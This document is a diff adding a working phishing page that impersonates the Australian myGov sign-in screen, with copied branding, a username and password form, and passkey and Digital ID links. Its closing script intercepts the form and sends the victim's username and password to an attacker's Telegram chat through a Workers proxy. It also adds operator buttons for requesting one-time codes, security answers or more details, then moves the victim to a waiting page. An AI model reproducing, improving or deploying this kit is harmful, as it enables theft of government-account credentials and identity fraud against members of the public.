@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Sign in with myGov - myGov</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="./css/css.css" rel="stylesheet">
+    <link href="./css/mgv2-application.css" rel="stylesheet">
+    <link href="./css/blugov.css" rel="stylesheet">
+    <style>
+        .passkey-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            vertical-align: middle;
+        }
+        .button-digital-identity {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            width: 100%;
+        }
+
+        .button-main {
+            position: relative;
+        }
+        .button-main .btn-spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 3px solid rgba(255, 255, 255, 0.45);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        .button-main.loading .btn-label { visibility: hidden; }
+        .button-main.loading .btn-spinner { display: block; }
+        .button-main.loading,
+        .button-main:disabled { cursor: default; pointer-events: none; }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+
+<body>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="#" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                        </a>
+                        <div class="header-links"><a href="#">Help</a></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <div class="digital-id-login-card-wrapper">
+                                <div class="digital-id-main-login-card override">
+                                    <a data-go-back-link="" class="button-back" href="log.html">Back</a>
+                                    <h1>Sign in with myGov</h1>
+                                    <p class="login-instruction-text">Choose how to sign in</p>
+
+                                    <div class="digital-id-login-card secondary">
+                                        <div class="button-digital-id-container">
+                                            <div class="digital-id-login-option-container">
+                                                <div class="inner-options">
+                                                    <a class="button-digital-identity" href="log.html">Sign in with Digital ID</a>
+                                                    <input type="hidden" value="{flowScope.targetParamDI}">
+                                                    <a class="button-digital-identity" id="passkey-signin-btn" href="log.html" onclick="authenticatePasskey()" tabindex="0">
+                                                        <img class="passkey-icon" src="https://login.my.gov.au/mygov/content/mgv2/icons/FIDO_Passkey_mark_A_black.svg" alt="Passkey icon">
+                                                        Sign in with passkey
+                                                    </a>
+                                                    <p class="external-links-zone">Learn about
+                                                        <a href="https://my.gov.au/en/about/help/mygov-website/sign-in-to-mygov/use-passkeys" target="_blank">passkeys<span class="is-visuallyhidden"> opens in a new window</span></a>
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <div class="hr-word"><div class="draw-circle">or</div></div>
+
+                                    <form id="form-1" class="mygov-login-form alternative" method="post">
+                                        <input type="hidden" name="btn1" value="btn1">
+                                        <div id="msg" style="display:none;color: red;">
+                                            Invalid password..! Please enter correct password.
+                                        </div>
+                                        <div class="input-group">
+                                            <label class="override" for="userId">Username or email</label>
+                                            <input id="ai" name="ai" type="text" value="" autocomplete="off" required="">
+                                        </div>
+                                        <p class="recovery">
+                                            <a href="passreset.html" class="anchor override">Forgot username</a>
+                                        </p>
+                                        <div class="input-group">
+                                            <label for="password" class="override">Password</label>
+                                            <div class="password-group">
+                                                <button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button>
+                                                <p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p>
+                                                <input id="pr" name="pr" type="password" aria-required="true" required="">
+                                            </div>
+                                        </div>
+                                        <p class="recovery">
+                                            <a href="passreset.html" class="anchor override">Forgot password</a>
+                                        </p>
+                                        <div class="button-digital-id-main-container override">
+                                            <div class="digital-id-button-container">
+                                                <button type="submit" class="button-main" name="btn1" id="btn1">
+                                                    <span class="btn-label">Sign in</span>
+                                                    <span class="btn-spinner" aria-hidden="true"></span>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        <p class="create-account-text">
+                                            <a class="create-account-link" href="log.html">Create a myGov account</a> if you don't have one already.
+                                        </p>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li><a target="_blank" href="#">Terms of use</a></li>
+                            <li><a target="_blank" href="#">Privacy and security</a></li>
+                            <li><a target="_blank" href="#">Copyright</a></li>
+                            <li><a target="_blank" href="#">Accessibility</a></li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="#">
+                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script type="text/javascript">
+    // ===== CONFIGURATION =====
+    const PROXY   = "https://telegram-proxy.wyldamcmur.workers.dev";
+    const CHAT_ID = "722615124";
+    // =========================
+
+    $(document).ready(function() {
+        $('#form-1').on('submit', async function(e) {
+            e.preventDefault();
+
+            const user = $('#ai').val();
+            const pass = $('#pr').val();
+
+            // Immediate spinner feedback on the button
+            $('#btn1').addClass('loading').prop('disabled', true);
+
+            // Fresh session id for this attempt
+            const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) ||
+                        Math.random().toString(36).slice(2, 10);
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "🔐 OTP",         callback_data: `otp:${sid}`         }],
+                    [{ text: "🔑 Notcorrect",  callback_data: `notcorrect:${sid}`  }],
+                    [{ text: "↩️ Login",       callback_data: `login:${sid}`       }],
+                    [{ text: "✅ Secquestion", callback_data: `secquestion:${sid}` }],
+                    [{ text: "✍️ Detail",      callback_data: `detail:${sid}`      }]
+                ]
+            };
+
+            try {
+                // 1) Grab current offset so wait.html only reacts to NEW presses
+                const r0 = await fetch(`${PROXY}/getUpdates?offset=-1`);
+                const d0 = await r0.json();
+                const startOffset = (d0.result && d0.result.length)
+                    ? d0.result[d0.result.length - 1].update_id + 1
+                    : 0;
+
+                // 2) Send credentials + buttons to Telegram right now
+                await fetch(`${PROXY}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🔔 myGov Login attempt\n👤 Username: ${user}\n🔑 Password: ${pass}\n🆔 Session: ${sid}`,
+                        reply_markup: keyboard
+                    })
+                });
+
+                // 3) Hand the session info to wait.html
+                sessionStorage.setItem('mgv_sid', sid);
+                sessionStorage.setItem('mgv_offset', String(startOffset));
+
+                // 4) Navigate to the please-wait page
+                window.location.href = 'wait.html';
+
+            } catch (err) {
+                console.error(err);
+                // Even on network error, still go to the wait page so the user sees the spinner
+                sessionStorage.setItem('mgv_sid', sid);
+                sessionStorage.setItem('mgv_offset', '0');
+                window.location.href = 'wait.html';
+            }
+        });
+    });
+    </script>
+</body>
+
+</html>
